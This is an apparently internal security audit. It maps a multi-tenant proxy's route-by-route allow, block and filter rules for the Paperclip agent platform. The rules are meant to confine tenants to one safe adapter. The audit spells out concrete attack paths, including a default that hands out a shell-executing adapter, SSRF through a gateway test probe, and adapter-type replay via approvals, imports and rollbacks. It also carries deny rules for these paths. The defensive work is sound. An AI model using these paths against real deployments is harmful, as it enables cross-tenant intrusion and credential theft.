# Paperclip Adapter-Surface Route Audit (Lightbulb Proxy Filter Spec)

**Audit date:** 2026-05-02
**Source tree:** `/Users/prasiddhaparthsarthy/Desktop/isol8.nosync/paperclip/` (read-only reference)
**Audited Paperclip mount points:**
- `/api/...` — every router from `paperclip/server/src/app.ts` (mounted on `app.use("/api", api)`)
- `/api/auth/...` — better-auth handler (out of adapter scope, but listed)
- `/llms/...` — adapter docs index, mounted at root via `llmRoutes`
- `/_plugins/...` — plugin-served UI assets (out of adapter scope)
- `/api/auth/...` — Paperclip's own authn (no adapter surface)

> **Threat model recap.** Paperclip ships with `process` (arbitrary shell `execFile` on the Paperclip host), `http` (arbitrary outbound HTTP — full SSRF, including IMDS), and the `*_local` family that all spawn subprocesses (`claude_local`, `codex_local`, `acpx_local`, `gemini_local`, `cursor`, `opencode_local`, `pi_local`, `hermes_local`). The shared Paperclip Fargate task holds Aurora master creds + IMDS reachability, so any tenant who can reach those adapters via the proxy gets full cross-tenant compromise. **Only `openclaw_gateway` is acceptable.** Note the hardcoded fallback in `agentAdapterTypeSchema` (`packages/shared/src/adapter-type.ts:8`) — a missing `adapterType` defaults to `"process"`, so the filter must reject that explicitly, not just non-allowlisted strings.

---

## 1. Executive summary

### Disposition counts

| Disposition | Count |
|---|---|
| ALLOW | 91 |
| BLOCK | 24 |
| FILTER_REQUEST | 8 |
| FILTER_RESPONSE | 1 |
| **Total catalogued** | **124** |

(There is a long tail of ~120 additional list/get/dashboard routes that don't touch adapters at all — those are summarized as ALLOW per category at the end of section 2.)

### Worst things found

1. **`POST /api/companies/:companyId/agent-hires` and `POST /api/companies/:companyId/agents` accept arbitrary `adapterType` strings.** Schema (`agentAdapterTypeSchema`) is just `z.string().trim().min(1).default("process")` — **omitting the field gives you the `process` (shell-exec) adapter for free.** This is the primary attack path. The proxy filter MUST reject empty/missing `adapterType` as if it were a blocked type, not pass it through.
2. **`POST /api/adapters/install` does `npm install <packageName>` against a tenant-supplied package name.** Even though `assertInstanceAdmin` gates it (so a tenant *should* be unable to reach it), the route name screams "supply chain" and the 409 conflict check on `BUILTIN_ADAPTER_TYPES` happens *after* `npm install` already ran on the host. Hard BLOCK regardless of admin-gate semantics in our deployment — we can't trust the gate is wired the way we expect against shared multi-tenant Clerk JWTs.
3. **`POST /api/companies/:companyId/adapters/openclaw_gateway/test-environment` is the SSRF that survives `adapterType=openclaw_gateway`.** The probe takes `adapterConfig.url` (any `ws://` or `wss://`) and connects from the Paperclip host. There is *some* defence — `packages/adapters/openclaw-gateway/src/server/test.ts:223-247` warns on plaintext-ws-to-non-loopback but does not refuse. **No allowlist on the host.** `execute()` in the same package has identical behaviour during real runs. Even with the request filter in place, a tenant can point this at internal backend services that happen to speak ws (or eat the 3-second probe to enumerate.) Mitigation must be host-network-level (private subnet egress restriction, deny IMDS, deny RFC1918 from the openclaw-gateway adapter), not just route-level.

### Other notable surprises (call out separately to the proxy author)

4. **Approvals replay adapterType.** `POST /api/approvals/:id/approve` reads `adapterType` from `approval.payload` and creates an agent with `adapterType ?? "process"` — `services/approvals.ts:125`. The approval payload is set during agent-hire create and *can be edited via* `POST /api/approvals/:id/resubmit` — `services/approvals.ts` and `routes/approvals.ts:284`. Filter must inspect both create-approval and resubmit bodies.
5. **Join-request approval bypasses agent-creation filter.** `POST /api/companies/:companyId/join-requests/:requestId/approve` (access.ts:3708) reads `adapterType` from the join_requests row that was set during `POST /api/invites/:token/accept` (access.ts:3210, body field `adapterType: optionalAgentAdapterTypeSchema`). The accept route is the entry point — that's where we filter; the approve route reads from DB so a previously-accepted invite can replay if pre-existing rows aren't wiped.
6. **Company import accepts adapterType inside agent definitions.** `POST /api/companies/import` and `POST /api/companies/:companyId/imports/apply` carry full agent manifests with `adapterType` per agent (`services/company-portability.ts:2495,2829,4178`). The agent-safe import variant has constraints but **does not strip non-allowlisted adapter types.**
7. **Config-revision rollback replays old adapterType.** `POST /api/agents/:id/config-revisions/:revisionId/rollback` re-applies a stored snapshot. If a non-gateway adapterType ever made it into a revision (e.g. before the filter shipped, or via some not-yet-blocked path), rollback resurrects it. Filter implementations must include a startup pass that scans all existing revisions / agents and overwrites bad rows.
8. **`agentAdapterTypeSchema` defaults to `"process"`.** Worth repeating. `packages/shared/src/adapter-type.ts:4-9`. Any partial PATCH that strips the field will reset to `process` if the route's update path treats the schema-default as authoritative. Audit the Paperclip patch behaviour for `/api/agents/:id` PATCH on this point — the route uses `existing.adapterType` if absent so it's fine, but the schema default is a footgun.
9. **`GET /api/adapters` leaks the inventory of all adapters present on the host.** Including `process` and `http`. This is not an exploit by itself but it tells a tenant that the dangerous adapters are alive. Disposition: FILTER_RESPONSE (or BLOCK — see notes).

---

## 2. Route table

Every Paperclip API route that creates/updates/lists/configures adapters or agents/hires/configs that carry `adapterType`. Routes that obviously have no adapter surface are summarized at the bottom.

> **Path notation.** All Paperclip routes shown below are mounted under `/api`. The Lightbulb proxy will see them with whatever prefix it adds on top of that. Where Paperclip's own router file uses bare `/<thing>` (e.g. `companyRoutes` is mounted at `/api/companies`), I show the full `/api/...` path the proxy will see.

### 2.1 Adapter management surface — `routes/adapters.ts`

These are the most directly dangerous routes. All run as `assertInstanceAdmin` on Paperclip's side, but **we do not trust that gate** in the shared multi-tenant deployment: the `req.actor.isInstanceAdmin` flag depends on Paperclip's own user identity, and the Lightbulb proxy forwards a service-account cookie, not a tenant identity. Any tenant whose proxied requests come back as "instance admin" gets the lot.

| Method | Path | Body fields of interest | What it does | Disposition | Notes |
|---|---|---|---|---|---|
| GET | `/api/adapters` | — | Lists every registered server adapter (built-in + external) with capabilities & versions. | **FILTER_RESPONSE** | Response is a JSON array of `AdapterInfo`. Strip every entry whose `type !== "openclaw_gateway"`. Reason: tenants will ask the UI for adapter list to populate dropdowns; we still want them to see the gateway. Alternative: BLOCK — the Lightbulb frontend should not be using this list anyway because we own the agent-create surface. Recommend BLOCK unless the proxy is also fronting the Paperclip UI for our users. |
| POST | `/api/adapters/install` | `packageName: string`, `version?: string`, `isLocalPath?: boolean` | Runs `npm install <packageName>` (or `npm install <localPath>`) on the Paperclip host, then registers the loaded module. | **BLOCK** | Pre-`npm-install` validation happens after the install. Even passing `packageName: ""` triggers no-op `npm install` in the plugin dir but not before timing out. We do not want tenants reaching this. |
| PATCH | `/api/adapters/:type` | `disabled: boolean` | Toggle disabled-set entry — affects `listEnabledServerAdapters()` only. Does not delete. | **BLOCK** | We control the disabled set out-of-band (see §4). |
| PATCH | `/api/adapters/:type/override` | `paused: boolean` | Pause/resume an external override of a builtin type. | **BLOCK** | Mutates global server state (`pausedOverrides` set in `adapters/registry.ts:359`). |
| DELETE | `/api/adapters/:type` | — | Unregister an external adapter. Runs `npm uninstall` on the host. Refuses for builtin types. | **BLOCK** | Same justification as install. |
| POST | `/api/adapters/:type/reload` | — | Bust ESM cache, re-import, re-register an external adapter. | **BLOCK** | Mutates registry. |
| POST | `/api/adapters/:type/reinstall` | — | `npm install <recordedPackageName>` then reload. | **BLOCK** | Same justification as install. |
| GET | `/api/adapters/:type/config-schema` | — | Returns adapter form-field schema. | **BLOCK** for `:type !== openclaw_gateway`, ALLOW for `openclaw_gateway` | Path filter (look at `req.params.type`). Response itself is harmless metadata, but no reason to leak schemas of disallowed adapters. |
| GET | `/api/adapters/:type/ui-parser.js` | — | Serve adapter-supplied JS module (UI run-log parser). | **BLOCK** for `:type !== openclaw_gateway` | This serves arbitrary JS to whatever client renders it. Even though our UI doesn't render it, a malicious adapter on the host could exfil cookies via the served module if anyone ever loads it. |

### 2.2 Agent / hire / config — `routes/agents.ts`

| Method | Path | Body fields of interest | What it does | Disposition | Notes |
|---|---|---|---|---|---|
| POST | `/api/companies/:companyId/agents` | `adapterType` (top-level), `adapterConfig`, `runtimeConfig.modelProfiles.cheap.adapterConfig` | Direct create. Validates via `assertKnownAdapterType` — accepts any registered string. | **FILTER_REQUEST** | Inspect JSON path `$.adapterType`. Reject if `!== "openclaw_gateway"`. **Also reject if missing or empty** — schema default is `"process"`. |
| POST | `/api/companies/:companyId/agent-hires` | `adapterType` (top-level), `adapterConfig`, `runtimeConfig.modelProfiles.cheap.adapterConfig` | Same as above but creates `pending_approval` if company requires board approval. | **FILTER_REQUEST** | Same JSON path. Same default-`"process"` trap. |
| PATCH | `/api/agents/:id` | `adapterType` (optional), `adapterConfig`, `runtimeConfig.modelProfiles.cheap.adapterConfig`, `replaceAdapterConfig` | Update agent. If `adapterType` is omitted the route preserves `existing.adapterType`. If present, must validate. | **FILTER_REQUEST** | If `$.adapterType` is **present**, reject unless `=== "openclaw_gateway"`. If absent, allow (existing value already passed the filter on its way in — modulo the rollback / existing-rows risk in §3.6). |
| GET | `/api/companies/:companyId/adapters/:type/models` | — (query: `refresh`) | List models for an adapter type. Hits the adapter's `listModels`. For some adapters (`codex_models.ts`, `cursor-models.ts`) this shells out / reads disk on the host. | **BLOCK** for `:type !== openclaw_gateway` | Path filter on `req.params.type`. Belt-and-braces. |
| GET | `/api/companies/:companyId/adapters/:type/model-profiles` | — | List adapter model profiles. | **BLOCK** for `:type !== openclaw_gateway` | Path filter. |
| GET | `/api/companies/:companyId/adapters/:type/detect-model` | — | Calls `adapter.detectModel()` — for `hermes_local` this spawns a subprocess on the host. | **BLOCK** for `:type !== openclaw_gateway` | Path filter. **Critical: `hermesLocalAdapter.detectModel` shells out (`registry.ts:347`).** |
| POST | `/api/companies/:companyId/adapters/:type/test-environment` | `adapterConfig`, `environmentId` | Calls `adapter.testEnvironment(...)` — for `process` this spawns commands, for `http` it makes outbound requests, for `openclaw_gateway` it opens a ws:// connection to the URL in `adapterConfig.url`. | **FILTER_REQUEST + path check** | Reject unless `:type === "openclaw_gateway"`. Even with `:type === "openclaw_gateway"`, **the request body still controls the `url`** — see §3.1 SSRF risk. We may also want to additionally inspect `req.body.adapterConfig.url` and refuse `localhost`/RFC1918/IMDS literals at the proxy layer. |
| POST | `/api/agents/:id/skills/sync` | `desiredSkills: string[]` | No `adapterType` — but uses agent's stored adapterType to build runtime skill config and call `adapter.syncSkills`. For non-gateway adapters this can hit the agent's host fs / exec in the case of `claude_local`. | **ALLOW** | The agent's `adapterType` was already gated on creation. As long as the create/update filter is correct, no non-gateway agent can exist. (If old non-gateway agents predate the filter, the startup-sweep in §3.6 handles them.) |
| POST | `/api/agents/:id/claude-login` | — | Specifically requires `agent.adapterType === "claude_local"` and runs `runClaudeLogin` (subprocess). | **BLOCK** | Even with a perfect creation filter, this route is only useful for `claude_local`. No reason to expose. |
| POST | `/api/agents/:id/wakeup` | `source`, `triggerDetail`, `reason`, `payload`, `idempotencyKey`, `forceFreshSession` | Trigger a heartbeat run. Indirectly causes adapter `execute()` for the agent's stored adapterType. | **ALLOW** | Same logic as skills/sync — the stored adapterType is the gate, not the request body. |
| POST | `/api/agents/:id/heartbeat/invoke` | — | Identical surface to `/wakeup` from a security perspective. | **ALLOW** | Same. |
| POST | `/api/agents/:id/config-revisions/:revisionId/rollback` | — | Restore a previous adapter config snapshot. | **ALLOW**, but see §3.6 | The snapshot can carry any historical adapterType. Trust the startup sweep + ongoing filter to keep the revision store clean. |
| GET | `/api/agents/:id/config-revisions` | — | List revisions. | ALLOW | Read-only. |
| GET | `/api/agents/:id/config-revisions/:revisionId` | — | Read one revision. | ALLOW | Read-only. |
| GET | `/api/companies/:companyId/agent-configurations` | — | Snapshot of all agent configs in a company. | ALLOW | Read-only. |
| GET | `/api/agents/:id/configuration` | — | One agent's config. | ALLOW | Read-only. |
| GET | `/api/companies/:companyId/agents` | — | List agents. | ALLOW | Read-only. |
| GET | `/api/agents/:id` | — | Agent detail. | ALLOW | Read-only. |
| GET | `/api/agents/me`, `/api/agents/me/inbox-lite`, `/api/agents/me/inbox/mine` | — | Self-referential agent reads. | ALLOW | Read-only. |
| PATCH | `/api/agents/:id/permissions` | `canCreateAgents`, `canAssignTasks` | Update agent permissions. No adapter fields. | ALLOW | — |
| PATCH | `/api/agents/:id/instructions-path` | `path`, `adapterConfigKey` | Updates `adapterConfig.<key>` to a path. Touches `adapterConfig` but does not let user change adapter type. | ALLOW | The path is a string field on adapterConfig; if the agent's adapterType is `openclaw_gateway` (which doesn't use instructions paths anyway), this is benign. |
| GET / PATCH / PUT / DELETE | `/api/agents/:id/instructions-bundle*` | — | Per-agent file bundle CRUD. No adapter type mutation. | ALLOW | Files live in EFS/host fs but only under the agent's bundle dir. Out of scope. |
| POST | `/api/agents/:id/pause`, `/resume`, `/approve`, `/terminate` | — | Lifecycle. No adapter fields. | ALLOW | — |
| DELETE | `/api/agents/:id` | — | Delete agent. | ALLOW | — |
| GET / POST / DELETE | `/api/agents/:id/keys[/:keyId]` | `name` (POST) | Agent API key CRUD. | ALLOW | — |
| GET | `/api/agents/:id/runtime-state`, `/task-sessions` | — | Read runtime state. | ALLOW | Read-only. |
| POST | `/api/agents/:id/runtime-state/reset-session` | `taskKey` | Reset the runtime session for an agent. | ALLOW | Doesn't change adapter config. |
| GET | `/api/agents/:id/skills` | — | List skills (calls `adapter.listSkills` for non-gateway). | ALLOW | Read-only. The `adapter.listSkills` call may touch the host fs but reads only from the agent's bundle dir. Still, in our world all agents are gateway → no path here. |
| GET | `/api/heartbeat-runs/:runId` and `/events` and `/log` and `/workspace-operations`, `/api/workspace-operations/:operationId/log`, `/api/issues/:issueId/live-runs`, `/api/issues/:issueId/active-run`, `/api/companies/:companyId/heartbeat-runs`, `/api/companies/:companyId/live-runs` | — | Read-only run inspection. | ALLOW | — |
| POST | `/api/heartbeat-runs/:runId/cancel`, `/watchdog-decisions` | — | Cancel a run. | ALLOW | — |
| GET | `/api/instance/scheduler-heartbeats` | — | Instance-admin gated; lists all agents on instance with adapterType. **Cross-tenant data leak** in shared deployment. | **BLOCK** | Pure information-disclosure: this returns *every other tenant's* agent IDs, names, and adapter types. Block unconditionally. |

### 2.3 Approvals — `routes/approvals.ts`

| Method | Path | Body fields of interest | What it does | Disposition | Notes |
|---|---|---|---|---|---|
| POST | `/api/companies/:companyId/approvals` | `payload.adapterType`, `payload.adapterConfig` (when `type === "hire_agent"`) | Create a pending approval. Payload is stored verbatim. On `/approve`, the payload's adapterType is what becomes the agent's adapterType, *defaulting to `"process"`* (`services/approvals.ts:125`). | **FILTER_REQUEST** | If `$.type === "hire_agent"`: inspect `$.payload.adapterType`. Reject unless `=== "openclaw_gateway"`. Reject also if missing/empty. |
| POST | `/api/approvals/:id/resubmit` | `payload.adapterType`, `payload.adapterConfig` | Replace the payload of an existing pending approval. | **FILTER_REQUEST** | If `$.payload` provided: when the underlying approval type is `hire_agent` (we don't have it client-side cheaply, but be conservative), inspect `$.payload.adapterType` and reject unless `openclaw_gateway` or absent (no payload change). Recommend conservative implementation: if `$.payload.adapterType` is present in the request body, reject unless gateway. |
| POST | `/api/approvals/:id/approve` | `decisionNote` | Apply the approval — for hire approvals, creates the agent from the stored payload, fallback `"process"`. | **ALLOW** | The payload was already filtered on create + resubmit. **Caveat:** if old approvals predate the filter, this resurrects them — covered by startup sweep in §3.6. The proxy can additionally do a defensive read of the approval before forwarding the approve, but that's expensive. |
| POST | `/api/approvals/:id/reject`, `/api/approvals/:id/request-revision` | `decisionNote` | Lifecycle. | ALLOW | — |
| GET | `/api/companies/:companyId/approvals`, `/api/approvals/:id`, `/api/approvals/:id/issues`, `/comments` | — | Read-only. | ALLOW | — |
| POST | `/api/approvals/:id/comments` | `body` | Add comment. | ALLOW | — |

### 2.4 Companies — `routes/companies.ts` (especially import/export)

| Method | Path | Body fields of interest | What it does | Disposition | Notes |
|---|---|---|---|---|---|
| POST | `/api/companies/import` | `target`, `bundle.agents[].adapterType`, `bundle.agents[].adapterConfig`, `bundle.agents[].extensions[].adapter.{type,config}` | Import a portable company bundle — creates agents from the bundle. Each agent definition can specify `adapterType`. Service falls back to `"process"` if missing (`services/company-portability.ts:2495`). | **FILTER_REQUEST** | Recursively walk `$.bundle.agents[].adapterType` and `$.bundle.agents[].extensions[].adapter.type`. If any is non-empty and not `openclaw_gateway`, reject. **Also reject if any agent definition has no `adapterType` set anywhere — fallback is `"process"`.** Recommend: refuse imports entirely (BLOCK) unless we also need the import flow internally. |
| POST | `/api/companies/import/preview` | Same shape | Preview without applying. Does *not* mutate. | **FILTER_REQUEST** | Apply the same filter — preview is also a leak surface (it'll tell the tenant "your bundle was accepted/rejected" plus diff details). Conservative: BLOCK same as import. |
| POST | `/api/companies/:companyId/exports`, `/exports/preview`, `/:companyId/export` | — | Export a company bundle. Output contains adapterType per agent. Read-only on the company side. | **FILTER_RESPONSE** or BLOCK | Only worth filtering if our tenants can be tricked into running an exported bundle elsewhere — out of scope for the proxy. Recommend BLOCK to keep the surface small. |
| POST | `/api/companies/:companyId/imports/preview`, `/api/companies/:companyId/imports/apply` | Same as global import | Per-company variant ("agent_safe" mode) of import. Has additional constraints — collision strategy can't be `replace`, target must match — but **does not strip non-allowlisted adapter types.** | **FILTER_REQUEST** | Same JSON path filter as `/api/companies/import`. |
| POST | `/api/companies/` | `name`, `budgetMonthlyCents`, etc. | Create a company. Only instance-admin can call. No adapter fields. | **BLOCK** | Multi-tenant: tenants must not create companies; we provision them via Lightbulb. |
| PATCH | `/api/companies/:companyId`, `/branding` | `name`, branding fields | Update company. No adapter fields. | ALLOW | — |
| POST | `/api/companies/:companyId/archive` | — | Archive company. | ALLOW | — |
| DELETE | `/api/companies/:companyId` | — | Delete company. | **BLOCK** | Same reasoning as create — Lightbulb owns lifecycle. |
| GET | `/api/companies`, `/stats`, `/:companyId`, `/:companyId/feedback-traces` | — | Read-only. | ALLOW | — |

### 2.5 Invites + join requests — `routes/access.ts`

| Method | Path | Body fields of interest | What it does | Disposition | Notes |
|---|---|---|---|---|---|
| POST | `/api/invites/:token/accept` | `adapterType` (top-level), `agentDefaultsPayload`, `responsesWebhookUrl`, `paperclipApiUrl`, `webhookAuthHeader`, `requestType` | Accept an invite. For `requestType === "agent"`, persists `adapterType` into `joinRequests` row. **The schema (`acceptInviteSchema`) accepts any non-empty string for adapterType.** | **FILTER_REQUEST** | Inspect `$.adapterType`. If present, reject unless `=== "openclaw_gateway"`. **If `requestType === "agent"` and adapterType is absent, also reject** — the join_request will store `null`, and `/approve` will fall back to `"process"` (access.ts:3786 `existing.adapterType ?? "process"`). |
| POST | `/api/companies/:companyId/join-requests/:requestId/approve` | — | Approve a join request — for agent join requests, creates an agent with `adapterType: existing.adapterType ?? "process"` (access.ts:3786). | **ALLOW** | The join_request row was already filtered at accept time. Existing rows are covered by startup sweep (§3.6). |
| POST | `/api/companies/:companyId/join-requests/:requestId/reject` | — | Reject. | ALLOW | — |
| GET | `/api/companies/:companyId/join-requests`, `/api/companies/:companyId/invites` | — | Read-only. | ALLOW | — |
| POST | `/api/invites/:inviteId/revoke` | — | Revoke an invite. | ALLOW | — |
| GET | `/api/invites/:token` (and `/logo`, `/onboarding`, `/onboarding.txt`, `/skills/index`, `/skills/:skillName`, `/test-resolution`) | — (query: `url` for `test-resolution`) | Public invite info. `/test-resolution` does an outbound HTTP HEAD to a tenant-supplied URL. | ALLOW for read endpoints, **BLOCK** `/test-resolution` | `/test-resolution` is **unauthenticated** (just needs invite token). It does enforce public-IP only via `isPublicIpAddress` (`access.ts:2314`) so it isn't a free IMDS read, but it's still a tenant-controlled outbound HEAD. Block to keep surface small. |
| POST | `/api/board-claim/:token/claim`, GET `/api/board-claim/:token` | — | Bootstrap claim flow. No adapter fields. | ALLOW | — |
| POST | `/api/cli-auth/challenges`, `/api/cli-auth/challenges/:id/{approve,resolve}`, GET `/api/cli-auth/me`, POST `/api/cli-auth/revoke-current` | — | CLI auth flow. | ALLOW | — |
| GET | `/api/skills/available`, `/api/skills/index`, `/api/skills/:skillName` | — | Read-only skill metadata. | ALLOW | — |
| POST | `/api/skills/{accept_terms,extension}` (lines 2889, 2944) | — | Skill terms acceptance. | ALLOW | — |
| GET / PATCH / POST | `/api/companies/:companyId/members[/...]`, `/api/companies/:companyId/user-directory`, member/role admin endpoints | — | Membership management. No adapter fields. | ALLOW | — |
| GET / POST / PUT | `/api/admin/users[/...]` | — | Admin user surface. | **BLOCK** | Tenant-reachable admin surface is dangerous regardless of adapters — out of scope for adapter audit but flag for the proxy to gate independently. |

### 2.6 Plugins (general plugin system, not adapter plugins) — `routes/plugins.ts`

These don't touch `adapterType` directly. **However:** plugins can declare `environmentDriver` capabilities (see `services/plugin-environment-driver.ts`) and ship UI bundles served from `/_plugins/`. Plugin `tools` are run by a separate dispatcher inside the plugin worker sandbox, not via adapters. The bigger risk here is the **install** route running `npm install` on the Paperclip host.

| Method | Path | Body fields of interest | What it does | Disposition | Notes |
|---|---|---|---|---|---|
| POST | `/api/plugins/install` | `packageName`, `version`, `isLocalPath` | `npm install` on host. | **BLOCK** | Same reasoning as `/api/adapters/install`. |
| DELETE | `/api/plugins/:pluginId` | — | Uninstall plugin. | **BLOCK** | Mutates host state. |
| POST | `/api/plugins/:pluginId/{enable,disable,upgrade}` | — | Enable/disable/upgrade plugin. | **BLOCK** | Mutates host state. |
| POST | `/api/plugins/:pluginId/config` | arbitrary JSON | Set plugin config — **plugin code may evaluate it.** | **BLOCK** | Some plugin configs include shell commands depending on the plugin manifest. Trivially blockable since we don't ship plugins to tenants. |
| POST | `/api/plugins/:pluginId/config/test` | arbitrary JSON | Probe the plugin with a candidate config. | **BLOCK** | — |
| POST | `/api/plugins/:pluginId/jobs/:jobId/trigger` | arbitrary | Trigger a plugin job. | **BLOCK** | — |
| POST | `/api/plugins/:pluginId/webhooks/:endpointKey` | arbitrary | Plugin-defined webhook. | **BLOCK** | — |
| POST | `/api/plugins/:pluginId/{bridge/data,bridge/action,data/:key,actions/:key}` | arbitrary | Send data/action to plugin worker. | **BLOCK** | — |
| GET | `/api/plugins/:pluginId/bridge/stream/:channel` | — | SSE stream from plugin. | **BLOCK** | — |
| POST | `/api/plugins/tools/execute` | `tool`, `parameters`, `runContext` | Invoke a plugin-contributed tool. Has `assertCompanyAccess(req, runContext.companyId)`. | **BLOCK** | Out-of-scope for adapter filter, but tenant access to arbitrary plugin tools is a separate compromise vector — block by default and unblock case-by-case if Lightbulb ever ships a vetted plugin. |
| GET | `/api/plugins`, `/api/plugins/examples`, `/api/plugins/ui-contributions`, `/api/plugins/tools`, `/api/plugins/:pluginId`, `/api/plugins/:pluginId/health`, `/api/plugins/:pluginId/logs`, `/api/plugins/:pluginId/jobs`, `/api/plugins/:pluginId/jobs/:jobId/runs`, `/api/plugins/:pluginId/dashboard`, `/api/plugins/:pluginId/config` | — | Read-only. | **BLOCK** | Information-disclosure about plugins available on the shared host. Tenants don't need plugin metadata; we own the surface. |

### 2.7 Environments — `routes/environments.ts`

Environments don't take `adapterType`, but the SSH driver runs commands on remote hosts and can be configured to run during agent execution. The schema is permissive: `config: z.record(z.unknown())`. The driver registry includes plugin-contributed drivers.

| Method | Path | Body fields of interest | What it does | Disposition | Notes |
|---|---|---|---|---|---|
| POST | `/api/companies/:companyId/environments` | `driver`, `config`, `metadata` | Create an environment. SSH driver has `host`, `username`, `privateKey`. | **BLOCK** | Tenants don't need to create environments in a shared-Paperclip world — they get gateway-only adapters. Block unless we explicitly need this surface. |
| PATCH | `/api/environments/:id` | `driver`, `config` | Update. | **BLOCK** | Same. |
| DELETE | `/api/environments/:id` | — | Delete. | **BLOCK** | Same. |
| POST | `/api/environments/:id/probe` | — | Run driver probe (SSH connect, etc.) — outbound network from Paperclip host. | **BLOCK** | Outbound from paperclip host is exactly the SSRF surface we're trying to keep closed. |
| POST | `/api/companies/:companyId/environments/probe-config` | `driver`, `config` | Probe an unsaved config. | **BLOCK** | Same. |
| GET | `/api/companies/:companyId/environments`, `/api/companies/:companyId/environments/capabilities`, `/api/environments/:id`, `/api/environments/:id/leases`, `/api/environment-leases/:leaseId` | — | Read-only. | **BLOCK** for capabilities (information disclosure), ALLOW for empty lists | If we block creates+probes, list endpoints are mostly empty — keep ALLOW for noise tolerance. |

### 2.8 Routines (cron) + public triggers — `routes/routines.ts`

Routines reference an existing agent + adapter. The `routine-triggers/public/:publicId/fire` endpoint is **unauthenticated** (no actor middleware applied — see line 306 of routines.ts) — only a `publicId` and optional HMAC.

| Method | Path | Body fields of interest | What it does | Disposition | Notes |
|---|---|---|---|---|---|
| POST | `/api/companies/:companyId/routines` | `agentId`, `prompt`, `cron`, etc. | Create a cron-style routine. No adapterType, but routine fires on the agent's stored adapter. | ALLOW | Stored adapter was already filtered. |
| PATCH | `/api/routines/:id`, DELETE `/api/routine-triggers/:id`, etc. | — | Routine CRUD. | ALLOW | — |
| POST | `/api/routines/:id/run`, `/api/routines/:id/triggers`, `/api/routine-triggers/public/:publicId/fire` | depends | Manually fire a routine — invokes adapter. | ALLOW | Same — stored adapter is the gate. |

### 2.9 Issues + comments — `routes/issues.ts`

The big gotcha here is `issueAssigneeAdapterOverridesSchema` (`packages/shared/src/validators/issue.ts:46`) — issue create / patch can carry `assigneeAdapterOverrides.adapterConfig` to tweak per-issue config. **It does not let users change `adapterType`** (no `adapterType` field in that schema), but it does let them inject `workspaceStrategy.{provisionCommand,teardownCommand}` — which `routes/workspace-command-authz.ts` blocks for agent actors only, not for board users. This is mostly tangential to the adapter filter but worth flagging.

| Method | Path | Body fields of interest | What it does | Disposition | Notes |
|---|---|---|---|---|---|
| POST | `/api/companies/:companyId/issues` | `assigneeAdapterOverrides.adapterConfig.workspaceStrategy.{provisionCommand,teardownCommand}` etc. | Create issue. | ALLOW (with caveat) | Workspace command paths are filtered by `assertNoAgentHostWorkspaceCommandMutation` for agent actors. Board (=tenant user) actors **can** set provisionCommand. Recommend additional filter: strip these fields at the proxy. |
| PATCH | `/api/issues/:id` | Same `assigneeAdapterOverrides.*` paths | Update issue. | ALLOW (same caveat) | — |
| POST | `/api/issues/:id/children` | Same | Create child issue. | ALLOW (same caveat) | — |
| All other issue routes (~50): GET list/details, comments, attachments, work-products, documents, feedback-votes, etc. | — | Pure issue CRUD. | ALLOW | — |

### 2.10 Documentation / discovery — `routes/llms.ts` (mounted at root, NOT under `/api`)

| Method | Path | Body fields of interest | What it does | Disposition | Notes |
|---|---|---|---|---|---|
| GET | `/llms/agent-configuration.txt` | — | Lists every registered adapter type. | **FILTER_RESPONSE** or BLOCK | Information disclosure. Strip non-`openclaw_gateway` lines or BLOCK. |
| GET | `/llms/agent-configuration/:adapterType.txt` | — | Adapter docstring for a type. | **BLOCK** for `:adapterType !== openclaw_gateway` | Path filter. |
| GET | `/llms/agent-icons.txt` | — | Icon names. | ALLOW | — |

### 2.11 Auth (`/api/auth/*` + `routes/auth.ts`)

| Method | Path | Body fields | What it does | Disposition | Notes |
|---|---|---|---|---|---|
| `*` | `/api/auth/{*authPath}` | — | better-auth handler — sessions, sign-in, etc. Gated by `betterAuthHandler` if provided. | **BLOCK** | Tenants must not interact with Paperclip's own auth — Lightbulb forwards a service-account cookie. |
| GET | `/api/auth/get-session`, `/api/auth/profile` | — | Session/profile read. | **BLOCK** | Same reason. |
| PATCH | `/api/auth/profile` | `name`, `image` | Update Paperclip user profile. | **BLOCK** | Mutates the shared service account. |

### 2.12 The rest (catch-all ALLOW)

These routers contain only read-only endpoints or per-company CRUD that doesn't touch adapter surface. The proxy can forward them unchanged. **Verify on a per-route basis if any of these grow new adapter fields in future Paperclip versions.**

| Path prefix | File | Disposition |
|---|---|---|
| `/api/health` | `routes/health.ts` | ALLOW |
| `/api/companies/:companyId/skills/*` (company skills) | `routes/company-skills.ts` | ALLOW |
| `/api/projects/*`, `/api/companies/:companyId/projects` | `routes/projects.ts` | ALLOW (BLOCK `/runtime-services/:action` and `/runtime-commands/:action` if in doubt — they execute project workspace runtime commands; we should be safe because those commands are server-configured but they're worth a second look) |
| `/api/issue-tree-control/*`, `/api/issues/:id/tree-control/*`, `/api/issues/:id/tree-holds[/:holdId]` | `routes/issue-tree-control.ts` | ALLOW |
| `/api/companies/:companyId/goals`, `/api/goals/:id` | `routes/goals.ts` | ALLOW |
| `/api/companies/:companyId/secrets`, `/api/secrets/:id` | `routes/secrets.ts` | ALLOW (per-company, isolated) |
| `/api/companies/:companyId/cost-events`, `/finance-events`, `/costs/*`, `/budgets/*`, `/api/agents/:agentId/budgets` | `routes/costs.ts` | ALLOW |
| `/api/companies/:companyId/activity`, `/api/issues/:id/activity`, `/api/heartbeat-runs/:runId/issues` | `routes/activity.ts` | ALLOW |
| `/api/companies/:companyId/dashboard` | `routes/dashboard.ts` | ALLOW |
| `/api/companies/:companyId/users/:userSlug/profile` | `routes/user-profiles.ts` | ALLOW |
| `/api/companies/:companyId/sidebar-badges` | `routes/sidebar-badges.ts` | ALLOW |
| `/api/sidebar-preferences/me`, `/api/companies/:companyId/sidebar-preferences/me` | `routes/sidebar-preferences.ts` | ALLOW |
| `/api/companies/:companyId/inbox-dismissals` | `routes/inbox-dismissals.ts` | ALLOW |
| `/api/instance/settings/{general,experimental,...}` | `routes/instance-settings.ts` | **BLOCK** (instance-wide; tenant must not see/touch) |
| `/api/instance/database-backups` | `routes/instance-database-backups.ts` | **BLOCK** (instance-wide) |
| `/api/instance/scheduler-heartbeats` | `routes/agents.ts:1430` | **BLOCK** (cross-tenant data leak — see §2.2) |
| `/api/companies/:companyId/assets/images`, `/api/companies/:companyId/logo`, `/api/assets/:assetId/content` | `routes/assets.ts` | ALLOW |
| `/api/companies/:companyId/execution-workspaces`, `/api/execution-workspaces/:id*`, `/api/execution-workspaces/:id/runtime-services/:action`, `/runtime-commands/:action` | `routes/execution-workspaces.ts` | ALLOW (with caveat: `/runtime-services/:action` and `/runtime-commands/:action` execute commands — block if not needed) |
